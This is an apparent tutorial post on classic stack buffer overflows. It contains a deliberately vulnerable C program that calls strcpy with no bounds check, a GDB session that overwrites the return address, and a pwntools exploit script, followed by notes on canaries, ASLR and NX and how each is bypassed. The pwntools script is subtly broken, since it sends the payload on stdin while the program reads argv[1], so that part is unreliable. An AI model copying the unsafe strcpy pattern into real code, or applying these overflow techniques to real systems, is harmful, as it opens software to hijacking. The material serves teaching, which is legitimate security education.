Buffer Overflow 101: Stack Smashing in Practice

A hands-on breakdown of classic stack-based buffer overflows — from understanding memory layout to crafting a working exploit payload with GDB.

// what is a buffer overflow?

A buffer overflow occurs when a program writes more data into a buffer than it can hold, spilling over into adjacent memory. On the stack, this lets an attacker overwrite the saved return address — redirecting code execution to arbitrary locations.

// vulnerable code

Here's the canonical example — a C program with no bounds checking:

#include <stdio.h>
#include <string.h>

void secret() {
    printf("You win!\n");
}

void vuln(char *input) {
    char buf[64];
    strcpy(buf, input);  // no bounds check!
}

int main(int argc, char **argv) {
    vuln(argv[1]);
    return 0;
}

Our goal: overflow buf to overwrite the return address with the address of secret().

// understanding the stack layout

When vuln() is called, the stack looks like this:

High addresses
┌─────────────────┐
│   argv[1] ptr   │  ← function argument
├─────────────────┤
│   saved RIP     │  ← return address (our target)
├─────────────────┤
│   saved RBP     │  ← base pointer (8 bytes)
├─────────────────┤
│                 │
│   buf[64]       │  ← our input goes here
│                 │
└─────────────────┘
Low addresses

To reach the return address we need to write: 64 bytes (buf) + 8 bytes (saved RBP) = 72 bytes of padding, then the address of secret().

// finding the address

$ gdb ./vuln
(gdb) info functions secret
0x0000000000401136  secret

(gdb) run $(python3 -c "print('A'*72 + '\x36\x11\x40\x00\x00\x00\x00\x00')")
You win!

// crafting the exploit with pwntools

from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

payload = b'A' * 72
payload += p64(elf.symbols['secret'])

p.sendline(payload)
p.interactive()

// mitigations & bypasses

Modern systems ship with several protections against this exact attack:

  • Stack Canaries — a random value placed between buffer and return address; checked before return. Bypassed by leaking the canary value.
  • ASLR — randomises base addresses. Bypassed with info leaks or brute-force (32-bit only).
  • NX/DEP — marks stack non-executable. Bypassed with ROP chains.

Each of those deserves its own post — and they'll get one.
